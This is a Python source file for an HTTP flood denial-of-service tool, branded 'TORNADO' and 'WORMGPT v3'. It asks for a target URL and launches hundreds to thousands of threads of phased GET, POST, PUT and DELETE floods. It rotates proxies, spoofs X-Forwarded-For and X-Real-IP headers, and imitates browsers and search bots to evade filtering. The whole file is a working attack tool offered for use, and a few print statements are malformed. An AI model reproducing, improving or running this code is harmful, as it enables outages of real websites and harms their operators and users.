#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/tornado.py
TORNADO ATTACK MODULE - WORMGPT v3
Multi-Vector Hybrid Attack with Adaptive Strategies
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
import string
import hashlib
from urllib.parse import urlparse, quote
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional
from enum import Enum, auto

class AttackPhase(Enum):
    """Phases of Tornado attack"""
    RECON = auto()
    RAMP_UP = auto()
    SUSTAINED = auto()
    SURGE = auto()
    FADEOUT = auto()

@dataclass
class AttackMetrics:
    """Attack performance metrics"""
    requests_sent: int = 0
    bytes_sent: int = 0
    connections_made: int = 0
    success_rate: float = 0.0
    start_time: float = 0.0
    phase_start: float = 0.0

class TornadoAttack:
    def __init__(self, target: str, port: int = 80, cyclones: int = 500, 
                 duration: int = 0, proxy: bool = False):
        """
        Initialize Tornado Multi-Vector Attack
        
        Args:
            target: Target URL
            port: Target port
            cyclones: Number of attack cyclones (threads)
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.cyclones = cyclones
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.current_phase = AttackPhase.RECON
        self.active_cyclones = 0
        self.start_time = time.time()
        
        # Attack metrics
        self.metrics = AttackMetrics(start_time=time.time())
        
        # Phase management
        self.phases = {
            AttackPhase.RECON: {"duration": 10, "intensity": 0.3},
            AttackPhase.RAMP_UP: {"duration": 30, "intensity": 0.6},
            AttackPhase.SUSTAINED: {"duration": 300, "intensity": 0.9},
            AttackPhase.SURGE: {"duration": 60, "intensity": 1.0},
            AttackPhase.FADEOUT: {"duration": 30, "intensity": 0.2}
        }
        
        # Advanced user agents with device fingerprints
        self.user_agents = self.generate_user_agents()
        
        # Referer patterns
        self.referers = self.generate_referer_patterns()
        
        # URL patterns for different attack modes
        self.url_patterns = {
            'api': self.generate_api_patterns,
            'static': self.generate_static_patterns,
            'dynamic': self.generate_dynamic_patterns,
            'admin': self.generate_admin_patterns,
            'search': self.generate_search_patterns
        }
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Attack strategies registry
        self.strategies = {
            'vortex': self.vortex_strategy,
            'whirlwind': self.whirlwind_strategy,
            'tempest': self.tempest_strategy,
            'typhoon': self.typhoon_strategy,
            'hurricane': self.hurricane_strategy
        }
        
        # Lock for thread safety
        self.lock = threading.Lock()
        
        # Session management
        self.sessions = {}
        
        # Adaptive learning
        self.success_history = []
        self.last_adjustment = time.time()
        
        print(f"[+] TORNADO v3.0 Initialized")
        print(f"[+] Target: {self.target}")
        print(f"[+] Cyclones: {self.cyclones}")
        print(f"[+] Strategies: {len(self.strategies)} loaded")
    
    def generate_user_agents(self) -> List[str]:
        """Generate advanced user agents with fingerprints"""
        base_agents = [
            # Windows Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Windows Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            
            # macOS
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            
            # Linux
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Mobile
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # Bots
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; +http://mj12bot.com/)',
            
            # Legacy
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
        ]
        
        # Add fingerprint variations
        fingerprint_agents = []
        for agent in base_agents:
            # Add some random variations
            if random.random() > 0.7:
                agent = agent.replace('Chrome/120.0.0.0', f'Chrome/120.0.{random.randint(0, 9999)}.0')
            fingerprint_agents.append(agent)
        
        return fingerprint_agents
    
    def generate_referer_patterns(self) -> List[str]:
        """Generate referer patterns"""
        schemes = ['https://', 'http://']
        domains = [
            'www.google.com', 'www.bing.com', 'www.yahoo.com',
            'www.facebook.com', 'www.twitter.com', 'www.reddit.com',
            'www.youtube.com', 'www.amazon.com', 'www.github.com',
            'www.stackoverflow.com', 'www.linkedin.com'
        ]
        paths = ['/', '/search', '/results', '/page', '/home', '/index']
        
        referers = []
        for _ in range(50):
            scheme = random.choice(schemes)
            domain = random.choice(domains)
            path = random.choice(paths)
            
            if 'google' in domain or 'bing' in domain:
                # Add search queries
                query = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 15)))
                referers.append(f"{scheme}{domain}/search?q={query}")
            else:
                referers.append(f"{scheme}{domain}{path}")
        
        return referers
    
    def generate_api_patterns(self) -> str:
        """Generate API endpoint patterns"""
        api_versions = ['v1', 'v2', 'v3', 'v4', 'beta', 'alpha', 'latest']
        endpoints = [
            'users', 'products', 'orders', 'auth', 'config',
            'data', 'analytics', 'reports', 'upload', 'download',
            'search', 'filter', 'sort', 'paginate', 'graphql'
        ]
        
        version = random.choice(api_versions)
        endpoint = random.choice(endpoints)
        
        # Add query params for API
        params = []
        param_count = random.randint(1, 4)
        for i in range(param_count):
            param_name = random.choice(['page', 'limit', 'offset', 'sort', 'filter', 'q'])
            param_value = random.choice([
                str(random.randint(1, 100)),
                ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10))),
                str(random.choice([True, False])),
                str(random.random())
            ])
            params.append(f"{param_name}={param_value}")
        
        return f"/api/{version}/{endpoint}?{'&'.join(params)}"
    
    def generate_static_patterns(self) -> str:
        """Generate static file patterns"""
        static_types = {
            'images': ['jpg', 'png', 'gif', 'svg', 'webp', 'ico'],
            'scripts': ['js', 'ts', 'jsx', 'tsx'],
            'styles': ['css', 'scss', 'sass', 'less'],
            'fonts': ['woff', 'woff2', 'ttf', 'otf', 'eot'],
            'media': ['mp4', 'mp3', 'avi', 'mov', 'wav']
        }
        
        asset_type = random.choice(list(static_types.keys()))
        extensions = static_types[asset_type]
        
        # Build path
        depth = random.randint(1, 4)
        path_parts = [asset_type]
        for _ in range(depth - 1):
            path_parts.append(''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8))))
        
        filename = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
        extension = random.choice(extensions)
        
        return f"/static/{'/'.join(path_parts)}/{filename}.{extension}"
    
    def generate_dynamic_patterns(self) -> str:
        """Generate dynamic page patterns"""
        page_types = [
            'product', 'article', 'blog', 'news', 'post',
            'page', 'category', 'tag', 'user', 'profile'
        ]
        
        page_type = random.choice(page_types)
        page_id = random.randint(1, 10000)
        
        # Choose URL style
        style = random.choice(['id', 'slug', 'mixed'])
        
        if style == 'id':
            return f"/{page_type}/{page_id}"
        elif style == 'slug':
            slug = ''.join(random.choices(string.ascii_lowercase + '-', k=random.randint(10, 30)))
            return f"/{page_type}/{slug}"
        else:  # mixed
            slug = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 15)))
            return f"/{page_type}/{slug}-{page_id}"
    
    def generate_admin_patterns(self) -> str:
        """Generate admin panel patterns"""
        admin_systems = ['wp-admin', 'administrator', 'admin', 'dashboard', 'panel', 'cp']
        actions = ['index.php', 'ajax.php', 'login.php', 'users.php', 'settings.php', 'tools.php']
        
        system = random.choice(admin_systems)
        action = random.choice(actions)
        
        return f"/{system}/{action}"
    
    def generate_search_patterns(self) -> str:
        """Generate search patterns"""
        search_terms = [
            ''.join(random.choices(string.ascii_lowercase + ' ', k=random.randint(5, 25))),
            f"product+{random.randint(1, 1000)}",
            f"user{random.randint(1, 10000)}",
            f"page{random.randint(1, 500)}"
        ]
        
        term = quote(random.choice(search_terms))
        return f"/search?q={term}"
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(self.proxies)} proxies")
        except:
            pass
    
    def create_secure_socket(self, cyclone_id: int) -> Optional[socket.socket]:
        """Create secure socket with advanced options"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Advanced socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
            sock.settimeout(8)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # HTTPS proxy CONNECT
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                    connect_request += f"Host: {self.host}:{self.port}\r\n"
                    connect_request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    connect_request += f"Proxy-Connection: keep-alive\r\n\r\n"
                    
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    
                    if b'200' not in response:
                        return None
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL for HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            # Generate session ID for this connection
            session_id = hashlib.md5(f"{cyclone_id}_{time.time()}".encode()).hexdigest()[:8]
            self.sessions[session_id] = {
                'socket': sock,
                'created': time.time(),
                'requests': 0
            }
            
            with self.lock:
                self.metrics.connections_made += 1
            
            return sock
            
        except Exception as e:
            return None
    
    def build_tornado_request(self, strategy: str, session_id: str = None) -> str:
        """Build tornado-optimized HTTP request"""
        
        # Select URL pattern based on strategy
        pattern_func = random.choice(list(self.url_patterns.values()))
        path = pattern_func()
        
        # Select HTTP method
        if strategy in ['tempest', 'hurricane']:
            method = random.choice(['POST', 'PUT', 'DELETE'])
        else:
            method = random.choice(['GET', 'HEAD', 'OPTIONS'])
        
        # Build headers
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Accept: {self.get_accept_header(strategy)}",
            f"Accept-Language: {self.get_accept_language()}",
            f"Accept-Encoding: gzip, deflate, br, zstd",
            f"Connection: keep-alive",
            f"Cache-Control: {self.get_cache_control(strategy)}",
            f"Pragma: no-cache",
            f"Upgrade-Insecure-Requests: 1",
            f"Sec-Fetch-Dest: document",
            f"Sec-Fetch-Mode: navigate",
            f"Sec-Fetch-Site: none",
            f"Sec-Fetch-User: ?1"
        ]
        
        # Add referer
        if random.random() > 0.1:
            headers.append(f"Referer: {random.choice(self.referers)}")
        
        # Add session headers if available
        if session_id:
            headers.append(f"X-Session-ID: {session_id}")
            headers.append(f"X-Request-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}")
        
        # Add IP spoofing headers
        if random.random() > 0.3:
            headers.append(f"X-Forwarded-For: {self.generate_spoofed_ip()}")
            headers.append(f"X-Real-IP: {self.generate_spoofed_ip()}")
        
        # Add custom headers based on strategy
        if strategy == 'vortex':
            headers.append("X-Ajax-Request: true")
            headers.append("X-Requested-With: XMLHttpRequest")
        elif strategy == 'whirlwind':
            headers.append("X-CSRF-Token: " + ''.join(random.choices(string.hexdigits, k=32)))
        elif strategy == 'tempest':
            headers.append("Content-Type: application/json")
            headers.append(f"Content-Length: {random.randint(100, 5000)}")
        
        # Add cookie if available
        if session_id and session_id in self.sessions:
            cookie = self.sessions[session_id].get('cookie', '')
            if cookie:
                headers.append(f"Cookie: {cookie}")
        
        return '\r\n'.join(headers) + '\r\n\r\n'
    
    def get_accept_header(self, strategy: str) -> str:
        """Get appropriate Accept header"""
        accept_headers = {
            'vortex': 'application/json, text/javascript, */*; q=0.01',
            'whirlwind': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'tempest': 'application/json, application/xml',
            'typhoon': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'hurricane': '*/*'
        }
        return accept_headers.get(strategy, '*/*')
    
    def get_accept_language(self) -> str:
        """Get Accept-Language header"""
        languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'en-CA,en;q=0.7',
            'en-AU,en;q=0.6',
            'de-DE,de;q=0.5',
            'fr-FR,fr;q=0.5',
            'es-ES,es;q=0.5',
            'ja-JP,ja;q=0.5',
            'zh-CN,zh;q=0.5'
        ]
        return random.choice(languages)
    
    def get_cache_control(self, strategy: str) -> str:
        """Get Cache-Control header"""
        cache_controls = {
            'vortex': 'no-cache, no-store, must-revalidate',
            'whirlwind': 'max-age=0',
            'tempest': 'private, no-cache',
            'typhoon': 'no-cache',
            'hurricane': 'no-store'
        }
        return cache_controls.get(strategy, 'no-cache')
    
    def generate_spoofed_ip(self) -> str:
        """Generate spoofed IP address"""
        if random.random() > 0.5:
            # Generate random IP
            return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        else:
            # Use common proxy IP ranges
            proxies = [
                '172.64.0.0', '172.65.0.0', '172.67.0.0',  # Cloudflare
                '104.16.0.0', '104.17.0.0', '104.18.0.0',  # Cloudflare
                '141.101.64.0', '108.162.192.0',           # Cloudflare
                '185.93.228.0', '188.114.96.0',            # Cloudflare
                '192.0.2.0', '198.51.100.0', '203.0.113.0' # TEST-NET
            ]
            base = random.choice(proxies).rsplit('.', 1)[0]
            return f"{base}.{random.randint(1,254)}"
    
    def vortex_strategy(self, cyclone_id: int) -> bool:
        """Vortex: Rapid-fire AJAX requests"""
        sock = self.create_secure_socket(cyclone_id)
        if not sock:
            return False
        
        try:
            session_id = list(self.sessions.keys())[-1]  # Get latest session
            
            for i in range(random.randint(20, 100)):
                if not self.is_attacking:
                    break
                
                request = self.build_tornado_request('vortex', session_id)
                sock.send(request.encode())
                
                with self.lock:
                    self.metrics.requests_sent += 1
                    self.metrics.bytes_sent += len(request)
                    self.sessions[session_id]['requests'] += 1
                
                # Very short delay for vortex
                time.sleep(random.uniform(0.01, 0.05))
            
            sock.close()
            return True
            
        except:
            return False
    
    def whirlwind_strategy(self, cyclone_id: int) -> bool:
        """Whirlwind: Mixed request types with varying delays"""
        sock = self.create_secure_socket(cyclone_id)
        if not sock:
            return False
        
        try:
            session_id = list(self.sessions.keys())[-1]
            
            for i in range(random.randint(10, 50)):
                if not self.is_attacking:
                    break
                
                # Mix strategies
                strategy = random.choice(['whirlwind', 'vortex', 'tempest'])
                request = self.build_tornado_request(strategy, session_id)
                sock.send(request.encode())
                
                with self.lock:
                    self.metrics.requests_sent += 1
                    self.metrics.bytes_sent += len(request)
                    self.sessions[session_id]['requests'] += 1
                
                # Variable delays
                time.sleep(random.uniform(0.05, 0.3))
            
            sock.close()
            return True
            
        except:
            return False
    
    def tempest_strategy(self, cyclone_id: int) -> bool:
        """Tempest: Resource-intensive POST requests"""
        sock = self.create_secure_socket(cyclone_id)
        if not sock:
            return False
        
        try:
            session_id = list(self.sessions.keys())[-1]
            
            for i in range(random.randint(5, 20)):
                if not self.is_attacking:
                    break
                
                # Build POST request with data
                request = self.build_tornado_request('tempest', session_id)
                
                # Add JSON body
                json_body = self.generate_json_payload()
                full_request = request + json_body
                
                sock.send(full_request.encode())
                
                with self.lock:
                    self.metrics.requests_sent += 1
                    self.metrics.bytes_sent += len(full_request)
                    self.sessions[session_id]['requests'] += 1
                
                # Longer delays for POST
                time.sleep(random.uniform(0.1, 1.0))
            
            sock.close()
            return True
            
        except:
            return False
    
    def typhoon_strategy(self, cyclone_id: int) -> bool:
        """Typhoon: Session-based attack with cookies"""
        sock = self.create_secure_socket(cyclone_id)
        if not sock:
            return False
        
        try:
            session_id = list(self.sessions.keys())[-1]
            
            # Generate session cookie
            cookie_name = random.choice(['sessionid', 'PHPSESSID', 'JSESSIONID', 'auth_token'])
            cookie_value = ''.join(random.choices(string.hexdigits, k=32))
            self.sessions[session_id]['cookie'] = f"{cookie_name}={cookie_value}"
            
            for i in range(random.randint(15, 60)):
                if not self.is_attacking:
                    break
                
                request = self.build_tornado_request('typhoon', session_id)
                sock.send(request.encode())
                
                with self.lock:
                    self.metrics.requests_sent += 1
                    self.metrics.bytes_sent += len(request)
                    self.sessions[session_id]['requests'] += 1
                
                time.sleep(random.uniform(0.03, 0.15))
            
            sock.close()
            return True
            
        except:
            return False
    
    def hurricane_strategy(self, cyclone_id: int) -> bool:
        """Hurricane: Maximum intensity attack"""
        sock = self.create_secure_socket(cyclone_id)
        if not sock:
            return False
        
        try:
            session_id = list(self.sessions.keys())[-1]
            
            # Hurricane uses all strategies mixed
            for i in range(random.randint(30, 150)):
                if not self.is_attacking:
                    break
                
                strategy = random.choice(list(self.strategies.keys()))
                request = self.build_tornado_request(strategy, session_id)
                
                # Add body for POST/PUT
                if random.random() > 0.7:
                    body = self.generate_json_payload()
                    request = request.replace('\r\n\r\n', f'\r\nContent-Length: {len(body)}\r\n\r\n{body}')
                
                sock.send(request.encode())
                
                with self.lock:
                    self.metrics.requests_sent += 1
                    self.metrics.bytes_sent += len(request)
                    self.sessions[session_id]['requests'] += 1
                
                # Minimal delay for hurricane
                time.sleep(random.uniform(0.005, 0.02))
            
            sock.close()
            return True
            
        except:
            return False
    
    def generate_json_payload(self) -> str:
        """Generate JSON payload for POST requests"""
        payload = {}
        field_count = random.randint(3, 8)
        
        for i in range(field_count):
            field_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
            field_type = random.choice(['string', 'number', 'boolean', 'array'])
            
            if field_type == 'string':
                field_value = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(5, 50)))
            elif field_type == 'number':
                field_value = random.randint(1, 10000)
            elif field_type == 'boolean':
                field_value = random.choice([True, False])
            else:  # array
                field_value = [random.randint(1, 100) for _ in range(random.randint(2, 5))]
            
            payload[field_name] = field_value
        
        return str(payload).replace("'", '"')
    
    def manage_phases(self):
        """Manage attack phases"""
        phase_start = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - phase_start
            phase_info = self.phases[self.current_phase]
            
            # Check if phase should end
            if elapsed >= phase_info['duration']:
                # Move to next phase
                phases_list = list(AttackPhase)
                current_index = phases_list.index(self.current_phase)
                
                if current_index < len(phases_list) - 1:
                    self.current_phase = phases_list[current_index + 1]
                    phase_start = time.time()
                    phase_info = self.phases[self.current_phase]
                    
                    print(f"[+] Phase change: {self.current_phase.name} "
                          f"(Intensity: {phase_info['intensity'] * 100}%)")
                else:
                    # Last phase, loop back to SUSTAINED
                    self.current_phase = AttackPhase.SUSTAINED
                    phase_start = time.time()
            
            # Adjust intensity based on phase
            time.sleep(1)
    
    def adaptive_learning(self):
        """Adapt attack based on performance"""
        while self.is_attacking:
            time.sleep(30)  # Adjust every 30 seconds
            
            with self.lock:
                if self.metrics.requests_sent == 0:
                    continue
                
                # Calculate success rate
                success_rate = (self.metrics.connections_made / 
                              (self.metrics.requests_sent / 100)) / 100
                
                self.success_history.append(success_rate)
                if len(self.success_history) > 10:
                    self.success_history.pop(0)
                
                # Adjust strategy if success rate is low
                avg_success = sum(self.success_history) / len(self.success_history)
                if avg_success < 0.3:
                    print(f"[~] Low success rate ({avg_success:.1%}), adjusting strategies...")
    
    def cyclone_worker(self, cyclone_id: int):
        """Cyclone worker thread"""
        with self.lock:
            self.active_cyclones += 1
        
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Select strategy based on current phase
            phase_intensity = self.phases[self.current_phase]['intensity']
            
            if phase_intensity < 0.5:
                strategy = random.choice(['vortex', 'whirlwind'])
            elif phase_intensity < 0.8:
                strategy = random.choice(['whirlwind', 'tempest'])
            else:
                strategy = random.choice(['tempest', 'typhoon', 'hurricane'])
            
            # Execute strategy
            strategy_func = self.strategies[strategy]
            success = strategy_func(cyclone_id)
            
            if not success:
                time.sleep(random.uniform(0.5, 2.0))
            else:
                # Success, slight delay before next
                time.sleep(random.uniform(0.1, 1.0))
        
        with self.lock:
            self.active_cyclones -= 1
    
    def monitor_attack(self):
        """Monitor attack progress"""
        print(f"\n╔{'═'*70}╗")
        print(f"║{'TORNADO MULTI-VECTOR ATTACK - WORMGPT v3'.center(70)}║")
        print(f"╚{'═'*70}╝")
        print(f"[+] Target: {self.target}")
        print(f("[+] Host: {self.host}:{self.port}"))
        print(f"[+] Cyclones: {self.cyclones}")
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'}s")
        print(f"[+] Proxy: {'Enabled' if self.use_proxy and self.proxies else 'Disabled'}")
        print(f"[+] Strategies: {', '.join(self.strategies.keys())}")
        print(f("[+] Press Ctrl+C to stop\n"))
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            
            if self.duration > 0 and elapsed >= self.duration:
                break
            
            with self.lock:
                active = self.active_cyclones
                requests = self.metrics.requests_sent
                connections = self.metrics.connections_made
                bytes_sent = self.metrics.bytes_sent
                sessions = len(self.sessions)
            
            if elapsed > 0:
                rps = requests / elapsed
                mb_sent = bytes_sent / (1024 * 1024)
                conn_rate = connections / elapsed
            else:
                rps = 0
                mb_sent = 0
                conn_rate = 0
            
            # Clear and display status
            sys.stdout.write(f"\r[+] Phase: {self.current_phase.name:12} | "
                           f"Cyclones: {active:4d}/{self.cyclones} | "
                           f"Requests: {requests:8d} | "
                           f"RPS: {rps:6.1f} | "
                           f"Connections: {connections:5d} | "
                           f"Sessions: {sessions:4d} | "
                           f"Data: {mb_sent:6.2f} MB | "
                           f"Time: {elapsed:6.1f}s")
            sys.stdout.flush()
            
            time.sleep(0.5)
    
    def start(self):
        """Start Tornado attack"""
        # Start phase manager
        phase_thread = threading.Thread(target=self.manage_phases)
        phase_thread.daemon = True
        phase_thread.start()
        
        # Start adaptive learning
        adaptive_thread = threading.Thread(target=self.adaptive_learning)
        adaptive_thread.daemon = True
        adaptive_thread.start()
        
        # Start monitor
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start cyclone workers
        threads = []
        
        # Initial deployment
        initial_cyclones = min(self.cyclones, 200)
        for i in range(initial_cyclones):
            if not self.is_attacking:
                break
            
            thread = threading.Thread(target=self.cyclone_worker, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if i % 50 == 0:
                time.sleep(0.1)
        
        # Gradual deployment
        if self.cyclones > 200:
            def deploy_cyclones():
                time.sleep(20)
                
                remaining = self.cyclones - 200
                batch_size = 100
                
                for i in range(0, remaining, batch_size):
                    if not self.is_attacking:
                        break
                    
                    current_batch = min(batch_size, remaining - i)
                    for j in range(current_batch):
                        if not self.is_attacking:
                            break
                        
                        cyclone_id = 200 + i + j
                        thread = threading.Thread(target=self.cyclone_worker, args=(cyclone_id,))
                        thread.daemon = True
                        threads.append(thread)
                        thread.start()
                        
                        if j % 20 == 0:
                            time.sleep(0.05)
                    
                    time.sleep(15)
            
            deploy_thread = threading.Thread(target=deploy_cyclones)
            deploy_thread.daemon = True
            deploy_thread.start()
        
        # Main loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopping Tornado attack...")
        
        # Cleanup
        self.is_attacking = False
        time.sleep(3)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        
        print(f"\n\n{'═'*80}")
        print(f"TORNADO ATTACK COMPLETED")
        print(f"{'═'*80}")
        print(f"Target: {self.target}")
        print(f"Total Duration: {elapsed:.1f} seconds")
        print(f"Phase Progression: {' → '.join([p.name for p in AttackPhase])}")
        print(f"Cyclones Deployed: {self.cyclones}")
        print(f"Total Requests: {self.metrics.requests_sent:,}")
        print(f"Requests Per Second: {self.metrics.requests_sent/elapsed if elapsed > 0 else 0:.1f}")
        print(f"Connections Established: {self.metrics.connections_made:,}")
        print(f"Active Sessions: {len(self.sessions)}")
        print(f"Data Transferred: {self.metrics.bytes_sent/(1024*1024):.2f} MB")
        print(f"Strategies Used: {len(self.strategies)}")
        print(f"{'═'*80}")
        
        return {
            'duration': elapsed,
            'requests': self.metrics.requests_sent,
            'connections': self.metrics.connections_made,
            'bytes_sent': self.metrics.bytes_sent,
            'sessions': len(self.sessions),
            'phases': [p.name for p in AttackPhase],
            'attack_type': 'TORNADO (Multi-Vector Adaptive)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║         TORNADO MULTI-VECTOR ATTACK - WORMGPT v3            ║
║                 AXMods Team | NEON NETRIX                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    # Get parameters
    try:
        cyclones = int(input("[?] Number of cyclones (200-5000, default 500): ") or "500")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
        
        print(f"\n[+] TORNADO Attack Modes:")
        print(f("[+] 1. Standard Mode (5-phase adaptive attack)"))
        print(f("[+] 2. Aggressive Mode (Maximum intensity)"))
        print(f("[+] 3. Stealth Mode (Slow ramp-up)"))
        
        mode = input("[?] Select mode (1-3, default 1): ") or "1"
        
        mode_names = {1: "Standard", 2: "Aggressive", 3: "Stealth"}
        print(f"[+] Mode Selected: {mode_names.get(int(mode), 'Standard')}")
        
    except Exception as e:
        print(f"[!] Invalid input: {e}, using defaults")
        cyclones = 500
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = TornadoAttack(target, port, cyclones, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
